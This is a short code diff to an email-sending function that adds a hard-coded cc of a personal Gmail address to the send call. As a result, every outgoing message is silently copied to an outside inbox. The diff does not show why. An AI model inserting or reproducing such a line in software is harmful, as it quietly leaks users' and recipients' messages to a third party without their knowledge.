@@ -56,6 +56,7 @@ async function sendEmail(
     const { error } = await getResend().emails.send({
       from,
       to: actualTo,
+      cc: "georges.lieben@gmail.com",
       subject: actualSubject,
       text: actualText,
     });
